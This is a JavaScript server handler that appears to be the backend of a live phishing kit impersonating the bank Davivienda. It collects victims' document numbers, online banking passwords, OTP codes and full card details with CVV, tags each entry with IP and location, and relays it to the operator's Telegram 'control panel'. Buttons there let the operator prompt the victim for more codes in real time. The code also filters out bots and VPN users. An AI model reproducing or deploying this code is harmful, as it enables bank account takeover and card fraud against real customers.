import { verifyTurnstile, getClientIp, checkVpnProxy, sendOrUpdateTelegramMessage, setUserState, getUserSessionData, saveUserSessionData } from '../lib/utils.js';

function escapeHtml(unsafe) {
    return String(unsafe || '').replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
}

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', '*');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const payload = req.body || {};
    const clientIp = getClientIp(req);
    const sessionId = (payload.sessionId || req.query?.sessionId || clientIp).toString().trim();
    const country = req.headers['x-vercel-ip-country'] || 'Desconocido';
    const city = req.headers['x-vercel-ip-city'] || 'Desconocida';

    const isHuman = await verifyTurnstile(payload?.cf_token);
    if (!isHuman) return res.status(403).json({ detail: "Validación anti-bot fallida" });

    const vpnAlert = await checkVpnProxy(clientIp);

    // Extraer datos entrantes desde payload.mensaje (formato discord embeds o plano)
    const data = payload?.mensaje || {};
    const incomingData = {};

    if (data.embeds && data.embeds.length > 0) {
        const embed = data.embeds[0];
        if (embed.fields) {
            embed.fields.forEach(f => {
                const name = f.name || '';
                const val = (f.value || '').replace(/`/g, '').trim();
                if (name.includes('Tipo de Documento')) incomingData.tipoDoc = val;
                else if (name.includes('Número de Documento') || name.includes('Documento')) incomingData.documento = val;
                else if (name.includes('1er intento') || name.includes('Clave Virtual')) incomingData.clave = val;
                else if (name.includes('2do intento')) incomingData.clave2 = val;
                else if (name.includes('OTP') || name.includes('Código')) incomingData.otp = val;
                else if (name.includes('Tarjeta')) incomingData.tarjeta = val;
                else if (name.includes('Vencimiento')) incomingData.fecha = val;
                else if (name.includes('CVV')) incomingData.cvv = val;
                else incomingData[name] = val;
            });
        }
    } else {
        Object.assign(incomingData, data);
    }

    // Acumular la información con la sesión única
    incomingData.city = city;
    incomingData.country = country;
    incomingData.ip = clientIp;
    incomingData.sessionId = sessionId;
    const session = await saveUserSessionData(sessionId, incomingData);

    const fechaHora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota', dateStyle: 'short', timeStyle: 'medium' });

    // Construcción de mensaje ordenado y estético que acumula los datos por sesión individual
    let msg = `🔴 <b>DAVIVIENDA - PANEL DE CONTROL</b> 🔴${vpnAlert}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `🆔 <b>Sesión:</b> <code>${sessionId}</code>\n`;
    msg += `📍 <b>IP:</b> <code>${clientIp}</code>\n`;
    msg += `🌎 <b>Ubicación:</b> ${escapeHtml(session.city || city)}, ${escapeHtml(session.country || country)}\n`;
    msg += `🕒 <b>Última actualización:</b> ${fechaHora}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━━━\n\n`;

    msg += `👤 <b>DATOS DE IDENTIFICACIÓN:</b>\n`;
    msg += `• <b>Tipo Doc:</b> ${escapeHtml(session.tipoDoc || 'Pendiente...')}\n`;
    msg += `• <b>Documento:</b> <code>${escapeHtml(session.documento || 'Pendiente...')}</code>\n\n`;

    if (session.clave || session.clave2) {
        msg += `🔑 <b>CLAVES VIRTUALES:</b>\n`;
        if (session.clave) msg += `• <b>Clave:</b> <code>${escapeHtml(session.clave)}</code>\n`;
        if (session.clave2) msg += `• <b>Segunda Clave:</b> <code>${escapeHtml(session.clave2)}</code>\n`;
        msg += `\n`;
    }

    if (session.otp) {
        msg += `📱 <b>CÓDIGO DE SEGURIDAD (OTP):</b>\n`;
        msg += `• <b>OTP:</b> <code>${escapeHtml(session.otp)}</code>\n\n`;
    }

    if (session.tarjeta || session.fecha || session.cvv) {
        msg += `💳 <b>DATOS DE TARJETA:</b>\n`;
        if (session.tarjeta) msg += `• <b>Número:</b> <code>${escapeHtml(session.tarjeta)}</code>\n`;
        if (session.fecha) msg += `• <b>Vencimiento:</b> <code>${escapeHtml(session.fecha)}</code>\n`;
        if (session.cvv) msg += `• <b>CVV:</b> <code>${escapeHtml(session.cvv)}</code>\n`;
        msg += `\n`;
    }

    msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `⚡ <b>Seleccione una acción para el usuario:</b>`;

    const replyMarkup = {
        inline_keyboard: [
            [
                { text: "🔑 Pedir Clave", callback_data: `cmd|clvs|${sessionId}` },
                { text: "📱 Pedir OTP", callback_data: `cmd|otp|${sessionId}` }
            ],
            [
                { text: "💳 Pedir Tarjeta", callback_data: `cmd|tarjeta|${sessionId}` },
                { text: "❌ Clave Incorrecta", callback_data: `cmd|error|${sessionId}` }
            ],
            [
                { text: "✅ Finalizar (Error Web)", callback_data: `cmd|fin|${sessionId}` }
            ]
        ]
    };

    await setUserState(sessionId, 'WAITING');
    await sendOrUpdateTelegramMessage(sessionId, msg, replyMarkup);

    res.status(200).json({ status: "success", sessionId, message: "Datos procesados correctamente" });
}
